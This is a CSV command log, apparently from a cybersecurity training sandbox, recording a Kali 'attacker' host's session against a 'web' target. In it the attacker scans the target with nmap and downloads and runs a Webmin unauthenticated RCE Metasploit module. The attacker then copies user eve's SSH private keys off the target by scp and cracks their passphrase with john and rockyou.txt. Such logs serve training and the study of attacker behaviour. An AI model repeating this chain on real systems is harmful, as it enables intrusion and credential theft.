sandbox_id,cmd_type,cmd_name,cmd_arguments,hostname,ip,level,username,timestamp_str,relative_timestamp_str
685,bash-command,ip,a,attacker,10.1.135.83,36,kali,2022-05-04T13:05:14.506Z,1970-01-01T00:24:58.087Z
685,msf-command,set,LHOST 10.1.135.83,attacker,10.1.135.83,36,null,2022-05-04T13:05:49.075Z,1970-01-01T00:25:32.656Z
685,bash-command,cd,/root/.ssh,attacker,10.1.135.83,38,kali,2022-05-04T13:41:51.770Z,1970-01-01T01:01:35.351Z
685,bash-command,su,NONE,attacker,10.1.135.83,38,kali,2022-05-04T13:41:58.477Z,1970-01-01T01:01:42.058Z
685,bash-command,cd,$HOME/.ssh,attacker,10.1.135.83,38,kali,2022-05-04T13:42:07.433Z,1970-01-01T01:01:51.014Z
685,bash-command,ls,-la $HOME,attacker,10.1.135.83,38,kali,2022-05-04T13:42:13.487Z,1970-01-01T01:01:57.068Z
685,bash-command,ls,-la,attacker,10.1.135.83,38,kali,2022-05-04T13:42:26.501Z,1970-01-01T01:02:10.082Z
685,bash-command,mkdir,.ssh,attacker,10.1.135.83,38,kali,2022-05-04T13:42:29.233Z,1970-01-01T01:02:12.814Z
685,bash-command,cd,.ssh,attacker,10.1.135.83,38,kali,2022-05-04T13:42:31.698Z,1970-01-01T01:02:15.279Z
685,bash-command,ssh-keygen,-t rsa,attacker,10.1.135.83,38,kali,2022-05-04T13:42:47.487Z,1970-01-01T01:02:31.068Z
685,bash-command,ls,.ssh,attacker,10.1.135.83,38,kali,2022-05-04T13:43:32.400Z,1970-01-01T01:03:15.981Z
685,bash-command,ls,NONE,attacker,10.1.135.83,38,kali,2022-05-04T13:43:35.067Z,1970-01-01T01:03:18.648Z
685,bash-command,cat,id_rsa.pub,attacker,10.1.135.83,38,kali,2022-05-04T13:43:39.586Z,1970-01-01T01:03:23.167Z
685,bash-command,cat,id_rsa.pub,attacker,10.1.135.83,38,kali,2022-05-04T13:43:49.161Z,1970-01-01T01:03:32.742Z
685,msf-command,run,NONE,attacker,10.1.135.83,38,null,2022-05-04T13:44:13.350Z,1970-01-01T01:03:56.931Z
685,msf-command,LP7A51okAXMy2UaXN76Fgd0YePBl16EbSpI9sevYVAkrbpRNyDY5ZClK1...,NONE,attacker,10.1.135.83,38,null,2022-05-04T13:44:13.578Z,1970-01-01T01:03:57.159Z
685,msf-command,kbH5ExUodxl+6SFyfOda+PXE6fkhtRvS2bDbYwMbb0bentl4QLWWRSo59...,kali@attacker,attacker,10.1.135.83,38,null,2022-05-04T13:45:03.758Z,1970-01-01T01:04:47.339Z
685,bash-command,ssh,172.18.1.5,attacker,10.1.135.83,38,kali,2022-05-04T13:47:53.192Z,1970-01-01T01:07:36.773Z
685,bash-command,cd,/home/eve/.ssh,web,172.18.1.5,38,root,2022-05-04T13:48:11.584Z,1970-01-01T01:07:55.165Z
685,bash-command,ls,NONE,web,172.18.1.5,38,root,2022-05-04T13:48:13.038Z,1970-01-01T01:07:56.619Z
685,bash-command,scp,* kali:10.1.135.83/home/kali/eve,web,172.18.1.5,38,root,2022-05-04T13:48:51.088Z,1970-01-01T01:08:34.669Z
685,bash-command,exit,NONE,web,172.18.1.5,38,root,2022-05-04T13:49:01.212Z,1970-01-01T01:08:44.793Z
685,bash-command,ssh,root@172.18.1.5,attacker,10.1.135.83,38,kali,2022-05-04T13:49:01.250Z,1970-01-01T01:08:44.831Z
685,bash-command,cd,..,attacker,10.1.135.83,38,kali,2022-05-04T13:49:04.834Z,1970-01-01T01:08:48.415Z
685,bash-command,cd,eve,attacker,10.1.135.83,38,kali,2022-05-04T13:49:07.061Z,1970-01-01T01:08:50.642Z
685,bash-command,mkdir,eve,attacker,10.1.135.83,38,kali,2022-05-04T13:49:09.444Z,1970-01-01T01:08:53.025Z
685,bash-command,cd,eve,attacker,10.1.135.83,38,kali,2022-05-04T13:49:11.064Z,1970-01-01T01:08:54.645Z
685,bash-command,scp,root@172.18.1.5/home/eve/.ssh .,attacker,10.1.135.83,38,kali,2022-05-04T13:49:29.789Z,1970-01-01T01:09:13.370Z
685,bash-command,scp,root@172.18.1.5/home/eve/.ssh/* .,attacker,10.1.135.83,38,kali,2022-05-04T13:49:48.184Z,1970-01-01T01:09:31.765Z
685,bash-command,scp,172.18.1.5/home/eve/ .,attacker,10.1.135.83,38,kali,2022-05-04T13:50:05.885Z,1970-01-01T01:09:49.466Z
685,bash-command,ls,/home/eve,web,172.18.1.5,38,root,2022-05-04T13:50:22.699Z,1970-01-01T01:10:06.280Z
685,bash-command,ls,-la /home/eve,web,172.18.1.5,38,root,2022-05-04T13:50:27.950Z,1970-01-01T01:10:11.531Z
685,bash-command,exit,NONE,web,172.18.1.5,38,root,2022-05-04T13:50:33.285Z,1970-01-01T01:10:16.866Z
685,bash-command,ssh,root@172.18.1.5,attacker,10.1.135.83,38,kali,2022-05-04T13:50:33.323Z,1970-01-01T01:10:16.904Z
685,bash-command,scp,root@172.18.1.5/home/eve/.ssh/ids_rsa .,attacker,10.1.135.83,38,kali,2022-05-04T13:50:51.521Z,1970-01-01T01:10:35.102Z
685,bash-command,scp,root@172.18.1.5:/home/eve/.ssh/* .,attacker,10.1.135.83,38,kali,2022-05-04T13:51:10.107Z,1970-01-01T01:10:53.688Z
685,bash-command,ls,id_rsa,attacker,10.1.135.83,38,kali,2022-05-04T13:51:23.876Z,1970-01-01T01:11:07.457Z
685,bash-command,cat,id_rsa,attacker,10.1.135.83,38,kali,2022-05-04T13:51:26.932Z,1970-01-01T01:11:10.513Z
685,bash-command,cat,id_rsa.pub,attacker,10.1.135.83,38,kali,2022-05-04T13:51:41.121Z,1970-01-01T01:11:24.702Z
685,bash-command,ssh2john,id_rsa > hash.txt,attacker,10.1.135.83,38,kali,2022-05-04T13:53:56.200Z,1970-01-01T01:13:39.781Z
685,bash-command,sudot,apt install john-data,attacker,10.1.135.83,38,kali,2022-05-04T13:54:26.599Z,1970-01-01T01:14:10.180Z
685,bash-command,sudo,apt install john-data,attacker,10.1.135.83,38,kali,2022-05-04T13:54:54.095Z,1970-01-01T01:14:37.676Z
685,bash-command,ssh2john,id_rsa > hash.txt,attacker,10.1.135.83,38,kali,2022-05-04T13:54:57.191Z,1970-01-01T01:14:40.772Z
685,bash-command,cat,hash.txt,attacker,10.1.135.83,38,kali,2022-05-04T13:54:59.946Z,1970-01-01T01:14:43.527Z
685,bash-command,tail,/usr/share/john/password.lst,attacker,10.1.135.83,38,kali,2022-05-04T13:58:14.227Z,1970-01-01T01:17:57.808Z
685,bash-command,head,/usr/share/john/password.lst,attacker,10.1.135.83,38,kali,2022-05-04T13:58:23.056Z,1970-01-01T01:18:06.637Z
685,bash-command,head,-n 30 /usr/share/john/password.lst,attacker,10.1.135.83,38,kali,2022-05-04T13:58:51.132Z,1970-01-01T01:18:34.713Z
685,bash-command,john,hash.txt,attacker,10.1.135.83,38,kali,2022-05-04T14:02:41.978Z,1970-01-01T01:22:25.559Z
685,bash-command,ls,-la,attacker,10.1.135.83,38,kali,2022-05-04T14:02:45.097Z,1970-01-01T01:22:28.678Z
685,bash-command,cd,/home/kali,attacker,10.1.135.83,38,kali,2022-05-04T14:02:53.279Z,1970-01-01T01:22:36.860Z
685,bash-command,ls,-la,attacker,10.1.135.83,38,kali,2022-05-04T14:02:56.945Z,1970-01-01T01:22:40.526Z
685,bash-command,ls,-la /usr/share/john,attacker,10.1.135.83,38,kali,2022-05-04T14:03:47.606Z,1970-01-01T01:23:31.187Z
685,bash-command,ls,-la Downloads,attacker,10.1.135.83,38,kali,2022-05-04T14:03:59.109Z,1970-01-01T01:23:42.690Z
685,bash-command,ls,-la Documents,attacker,10.1.135.83,38,kali,2022-05-04T14:04:05.195Z,1970-01-01T01:23:48.776Z
685,bash-command,ls,-la,attacker,10.1.135.83,38,kali,2022-05-04T14:04:07.997Z,1970-01-01T01:23:51.578Z
685,bash-command,ls,-la Desktop,attacker,10.1.135.83,38,kali,2022-05-04T14:04:23.519Z,1970-01-01T01:24:07.100Z
685,bash-command,ls,-la .john,attacker,10.1.135.83,38,kali,2022-05-04T14:04:29.614Z,1970-01-01T01:24:13.195Z
685,bash-command,cd,/kali,attacker,10.1.135.83,38,kali,2022-05-04T14:05:14.068Z,1970-01-01T01:24:57.649Z
685,bash-command,find,/ -name (quote)rockyou.txt(quote),attacker,10.1.135.83,38,kali,2022-05-04T14:06:31.336Z,1970-01-01T01:26:14.917Z
685,bash-command,john,--help,attacker,10.1.135.83,38,kali,2022-05-04T14:06:54.920Z,1970-01-01T01:26:38.501Z
685,bash-command,cd,eve,attacker,10.1.135.83,38,kali,2022-05-04T14:07:05.460Z,1970-01-01T01:26:49.041Z
685,bash-command,john,--wordlist /user/share/wordlist/rockyou.txt hash.txt,attacker,10.1.135.83,38,kali,2022-05-04T14:07:30.949Z,1970-01-01T01:27:14.530Z
685,bash-command,john,--wordlist /user/share/wordlists/rockyou.txt hash.txt,attacker,10.1.135.83,38,kali,2022-05-04T14:07:41.882Z,1970-01-01T01:27:25.463Z
685,bash-command,john,--wordlist /usr/share/wordlists/rockyou.txt hash.txt,attacker,10.1.135.83,38,kali,2022-05-04T14:07:52.087Z,1970-01-01T01:27:35.668Z
685,bash-command,../ssh2john.py,id_rsa -> hash.txt,attacker,10.1.135.83,38,kali,2022-05-04T14:08:39.984Z,1970-01-01T01:28:23.565Z
685,bash-command,john,--wordlist /usr/share/wordlists/rockyou.txt hash.txt,attacker,10.1.135.83,38,kali,2022-05-04T14:08:45.785Z,1970-01-01T01:28:29.366Z
685,bash-command,john,--wordlist /usr/share/wordlists/rockyou.txt --format=SSH hash.txt,attacker,10.1.135.83,38,kali,2022-05-04T14:09:14.102Z,1970-01-01T01:28:57.683Z
685,bash-command,john,hash.txt --wordlist /usr/share/wordlists/rockyou.txt,attacker,10.1.135.83,38,kali,2022-05-04T14:09:52.527Z,1970-01-01T01:29:36.108Z
685,bash-command,john,hash.txt --wordlist /usr/share/wordlists/rockyou.txt,attacker,10.1.135.83,38,kali,2022-05-04T14:11:21.132Z,1970-01-01T01:31:04.713Z
685,bash-command,head,/usr/share/wordlists/rockyou.txt,attacker,10.1.135.83,38,kali,2022-05-04T14:11:28.468Z,1970-01-01T01:31:12.049Z
685,bash-command,../ssh2john.py,id_rsa > hash.txt,attacker,10.1.135.83,38,kali,2022-05-04T14:11:43.831Z,1970-01-01T01:31:27.412Z
685,bash-command,john,hash.txt --wordlist /usr/share/wordlists/rockyou.txt,attacker,10.1.135.83,38,kali,2022-05-04T14:11:50.234Z,1970-01-01T01:31:33.815Z
685,bash-command,cat,hash.txt,attacker,10.1.135.83,38,kali,2022-05-04T14:12:07.217Z,1970-01-01T01:31:50.798Z
685,bash-command,john,hash.txt --wordlist /usr/share/wordlists/rockyou.txt,attacker,10.1.135.83,38,kali,2022-05-04T14:12:15.263Z,1970-01-01T01:31:58.844Z
685,bash-command,john,hash.txt --wordlist /usr/share/wordlists/rockyou.txt,attacker,10.1.135.83,38,kali,2022-05-04T14:12:53.673Z,1970-01-01T01:32:37.254Z
685,bash-command,john,hash.txt --wordlist=/usr/share/wordlists/rockyou.txt,attacker,10.1.135.83,38,kali,2022-05-04T14:13:40.438Z,1970-01-01T01:33:24.019Z
685,bash-command,john,hash.txt --wordlist=/usr/share/wordlists/rockyou.txt,attacker,10.1.135.83,38,kali,2022-05-04T14:13:45.472Z,1970-01-01T01:33:29.053Z
682,bash-command,ll,NONE,attacker,10.1.135.83,34,kali,2022-05-04T12:43:50.100Z,1970-01-01T00:03:35.018Z
682,bash-command,ll,NONE,attacker,10.1.135.83,34,kali,2022-05-04T12:43:52.754Z,1970-01-01T00:03:37.672Z
682,bash-command,vim,ssh2john.py,attacker,10.1.135.83,34,kali,2022-05-04T12:44:07.598Z,1970-01-01T00:03:52.516Z
682,bash-command,vim,ssh2john.py,attacker,10.1.135.83,34,kali,2022-05-04T12:44:08.555Z,1970-01-01T00:03:53.473Z
682,bash-command,vim,ssh2john.py,attacker,10.1.135.83,34,kali,2022-05-04T12:44:08.701Z,1970-01-01T00:03:53.619Z
682,bash-command,vim,ssh2john.py,attacker,10.1.135.83,34,kali,2022-05-04T12:44:08.826Z,1970-01-01T00:03:53.744Z
682,bash-command,ping,172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:44:25.904Z,1970-01-01T00:04:10.822Z
682,bash-command,ping,172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:44:26.060Z,1970-01-01T00:04:10.978Z
682,bash-command,ping,172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:44:26.307Z,1970-01-01T00:04:11.225Z
682,bash-command,ping,172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:44:26.450Z,1970-01-01T00:04:11.368Z
682,bash-command,nmap,172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:44:30.576Z,1970-01-01T00:04:15.494Z
682,bash-command,snet-sensor-mgmtman,nmap,attacker,10.1.135.83,34,kali,2022-05-04T12:45:20.438Z,1970-01-01T00:05:05.356Z
682,bash-command,snet-sensor-mgmtman,nmap,attacker,10.1.135.83,34,kali,2022-05-04T12:45:23.798Z,1970-01-01T00:05:08.716Z
682,bash-command,snet-sensor-mgmtman,nmap,attacker,10.1.135.83,34,kali,2022-05-04T12:45:24.001Z,1970-01-01T00:05:08.919Z
682,bash-command,man,nmap,attacker,10.1.135.83,34,kali,2022-05-04T12:45:49.684Z,1970-01-01T00:05:34.602Z
682,bash-command,nmap,-A 172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:46:35.515Z,1970-01-01T00:06:20.433Z
682,bash-command,nmap,172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:46:53.519Z,1970-01-01T00:06:38.437Z
682,bash-command,ssh,172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:47:28.741Z,1970-01-01T00:07:13.659Z
682,bash-command,ssh,172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:47:29.184Z,1970-01-01T00:07:14.102Z
682,bash-command,ssh,172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:47:29.346Z,1970-01-01T00:07:14.264Z
682,bash-command,man,namp,attacker,10.1.135.83,34,kali,2022-05-04T12:47:33.952Z,1970-01-01T00:07:18.870Z
682,bash-command,man,nmap,attacker,10.1.135.83,34,kali,2022-05-04T12:48:22.546Z,1970-01-01T00:08:07.464Z
682,bash-command,man,nmap,attacker,10.1.135.83,34,kali,2022-05-04T12:48:23.071Z,1970-01-01T00:08:07.989Z
682,bash-command,man,nmap,attacker,10.1.135.83,34,kali,2022-05-04T12:48:23.243Z,1970-01-01T00:08:08.161Z
682,bash-command,man,nmap,attacker,10.1.135.83,34,kali,2022-05-04T12:48:23.484Z,1970-01-01T00:08:08.402Z
682,bash-command,ping,172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:48:28.202Z,1970-01-01T00:08:13.120Z
682,bash-command,ping,172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:48:28.634Z,1970-01-01T00:08:13.552Z
682,bash-command,ping,172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:48:28.826Z,1970-01-01T00:08:13.744Z
682,bash-command,nmap,-sp 172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:49:21.749Z,1970-01-01T00:09:06.667Z
682,bash-command,nmap,172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:51:01.512Z,1970-01-01T00:10:46.430Z
682,bash-command,nmap,-p 10000 172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:51:27.635Z,1970-01-01T00:11:12.553Z
682,bash-command,hostname,172.18.1.5.,attacker,10.1.135.83,34,kali,2022-05-04T12:52:14.909Z,1970-01-01T00:11:59.827Z
682,bash-command,hostname,172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:52:17.385Z,1970-01-01T00:12:02.303Z
682,bash-command,hostname,172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:52:19.008Z,1970-01-01T00:12:03.926Z
682,bash-command,hostname,172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:52:19.187Z,1970-01-01T00:12:04.105Z
682,bash-command,sudo,nmap 172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:52:26.691Z,1970-01-01T00:12:11.609Z
682,bash-command,sudo,nmap 172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:52:28.316Z,1970-01-01T00:12:13.234Z
682,bash-command,sudo,nmap 172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:52:28.527Z,1970-01-01T00:12:13.445Z
682,bash-command,ll,NONE,attacker,10.1.135.83,34,kali,2022-05-04T12:56:10.726Z,1970-01-01T00:15:55.644Z
682,bash-command,nmap,--help,attacker,10.1.135.83,34,kali,2022-05-04T12:56:28.092Z,1970-01-01T00:16:13.010Z
682,bash-command,nmap,--help,attacker,10.1.135.83,34,kali,2022-05-04T12:56:36.566Z,1970-01-01T00:16:21.484Z
682,bash-command,nmap,--help,attacker,10.1.135.83,34,kali,2022-05-04T12:56:36.715Z,1970-01-01T00:16:21.633Z
682,bash-command,nmap,-v 172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:56:44.559Z,1970-01-01T00:16:29.477Z
682,bash-command,nmap,--help,attacker,10.1.135.83,34,kali,2022-05-04T12:57:20.092Z,1970-01-01T00:17:05.010Z
682,bash-command,nmap,-v -A 172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:58:20.723Z,1970-01-01T00:18:05.641Z
682,bash-command,nmap,-v -A 172.18.1.5,attacker,10.1.135.83,36,kali,2022-05-04T13:03:22.150Z,1970-01-01T00:23:07.068Z
682,bash-command,nmap,-v -A 172.18.1.5,attacker,10.1.135.83,36,kali,2022-05-04T13:03:22.288Z,1970-01-01T00:23:07.206Z
682,bash-command,ll,NONE,attacker,10.1.135.83,36,kali,2022-05-04T13:03:22.763Z,1970-01-01T00:23:07.681Z
682,bash-command,ll,NONE,attacker,10.1.135.83,36,kali,2022-05-04T13:05:33.772Z,1970-01-01T00:25:18.690Z
682,bash-command,vim,webmin.sh,attacker,10.1.135.83,36,kali,2022-05-04T13:06:02.549Z,1970-01-01T00:25:47.467Z
682,bash-command,vim,webmin.sh,attacker,10.1.135.83,36,kali,2022-05-04T13:06:03.884Z,1970-01-01T00:25:48.802Z
682,bash-command,chmod,+x webmin.sh,attacker,10.1.135.83,36,kali,2022-05-04T13:06:11.079Z,1970-01-01T00:25:55.997Z
682,bash-command,./webmin.sh,172.18.1.5,attacker,10.1.135.83,36,kali,2022-05-04T13:06:22.086Z,1970-01-01T00:26:07.004Z
682,bash-command,rm,webmin.sh,attacker,10.1.135.83,36,kali,2022-05-04T13:06:45.499Z,1970-01-01T00:26:30.417Z
682,bash-command,wget,https://netix.dl.sourceforge.net/project/webadmin/webmin/1.920/webmin_1.920_all.deb,attacker,10.1.135.83,36,kali,2022-05-04T13:11:15.756Z,1970-01-01T00:31:00.674Z
682,bash-command,dpkg,-i webmin_1.920_all.deb,attacker,10.1.135.83,36,kali,2022-05-04T13:11:22.714Z,1970-01-01T00:31:07.632Z
682,bash-command,dpkg,-i webmin_1.920_all.deb,attacker,10.1.135.83,36,kali,2022-05-04T13:11:23.692Z,1970-01-01T00:31:08.610Z
682,bash-command,dpkg,-i webmin_1.920_all.deb,attacker,10.1.135.83,36,kali,2022-05-04T13:11:23.834Z,1970-01-01T00:31:08.752Z
682,bash-command,dpkg,-i webmin_1.920_all.deb,attacker,10.1.135.83,36,kali,2022-05-04T13:11:23.973Z,1970-01-01T00:31:08.891Z
682,bash-command,sudo,dpkg -i webmin_1.920_all.deb,attacker,10.1.135.83,36,kali,2022-05-04T13:11:47.357Z,1970-01-01T00:31:32.275Z
682,bash-command,sudo,dpkg -i webmin_1.920_all.deb,attacker,10.1.135.83,36,kali,2022-05-04T13:11:52.735Z,1970-01-01T00:31:37.653Z
682,bash-command,sudo,dpkg -i webmin_1.920_all.deb,attacker,10.1.135.83,36,kali,2022-05-04T13:11:52.907Z,1970-01-01T00:31:37.825Z
682,bash-command,msfconsole,NONE,attacker,10.1.135.83,36,kali,2022-05-04T13:12:21.810Z,1970-01-01T00:32:06.728Z
682,bash-command,msfconsole,NONE,attacker,10.1.135.83,36,kali,2022-05-04T13:12:22.001Z,1970-01-01T00:32:06.919Z
682,bash-command,man,msfconsole,attacker,10.1.135.83,36,kali,2022-05-04T13:12:30.250Z,1970-01-01T00:32:15.168Z
682,bash-command,man,msfconsole,attacker,10.1.135.83,36,kali,2022-05-04T13:12:31.153Z,1970-01-01T00:32:16.071Z
682,bash-command,man,msfconsole,attacker,10.1.135.83,36,kali,2022-05-04T13:12:31.300Z,1970-01-01T00:32:16.218Z
682,bash-command,man,msfconsole,attacker,10.1.135.83,36,kali,2022-05-04T13:12:31.419Z,1970-01-01T00:32:16.337Z
682,bash-command,man,msfconsole,attacker,10.1.135.83,36,kali,2022-05-04T13:12:59.910Z,1970-01-01T00:32:44.828Z
682,bash-command,man,msfconsole,attacker,10.1.135.83,36,kali,2022-05-04T13:13:00.058Z,1970-01-01T00:32:44.976Z
682,bash-command,man,msfconsole,attacker,10.1.135.83,36,kali,2022-05-04T13:13:00.221Z,1970-01-01T00:32:45.139Z
682,bash-command,msfconsole,NONE,attacker,10.1.135.83,36,kali,2022-05-04T13:14:57.739Z,1970-01-01T00:34:42.657Z
682,bash-command,msfconsole,NONE,attacker,10.1.135.83,36,kali,2022-05-04T13:14:58.860Z,1970-01-01T00:34:43.778Z
682,bash-command,msfconsole,NONE,attacker,10.1.135.83,36,kali,2022-05-04T13:14:59Z,1970-01-01T00:34:43.918Z
682,bash-command,msfconsole,NONE,attacker,10.1.135.83,36,kali,2022-05-04T13:14:59.131Z,1970-01-01T00:34:44.049Z
682,bash-command,wget,https://pentest.com.tr/blog/defcon-0days-10102019/defcon_webmin_unauth_rce.rb,attacker,10.1.135.83,36,kali,2022-05-04T13:15:22.776Z,1970-01-01T00:35:07.694Z
682,bash-command,ll,NONE,attacker,10.1.135.83,36,kali,2022-05-04T13:15:24.402Z,1970-01-01T00:35:09.320Z
682,bash-command,rm,webmin_1.920_all.deb,attacker,10.1.135.83,36,kali,2022-05-04T13:15:28.145Z,1970-01-01T00:35:13.063Z
682,bash-command,cat,defcon_webmin_unauth_rce.rb,attacker,10.1.135.83,36,kali,2022-05-04T13:15:32.426Z,1970-01-01T00:35:17.344Z
682,bash-command,vim,defcon_webmin_unauth_rce.rb,attacker,10.1.135.83,36,kali,2022-05-04T13:15:37.711Z,1970-01-01T00:35:22.629Z
682,msf-command,help,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:17:09.582Z,1970-01-01T00:36:54.500Z
682,bash-command,msfconsole,NONE,attacker,10.1.135.83,36,kali,2022-05-04T13:19:39.521Z,1970-01-01T00:39:24.439Z
682,bash-command,msfconsole,NONE,attacker,10.1.135.83,36,kali,2022-05-04T13:19:40.183Z,1970-01-01T00:39:25.101Z
682,bash-command,msfconsole,NONE,attacker,10.1.135.83,36,kali,2022-05-04T13:19:40.334Z,1970-01-01T00:39:25.252Z
682,bash-command,msfconsole,NONE,attacker,10.1.135.83,36,kali,2022-05-04T13:19:40.493Z,1970-01-01T00:39:25.411Z
682,bash-command,vim,defcon_webmin_unauth_rce.rb,attacker,10.1.135.83,36,kali,2022-05-04T13:20:26.387Z,1970-01-01T00:40:11.305Z
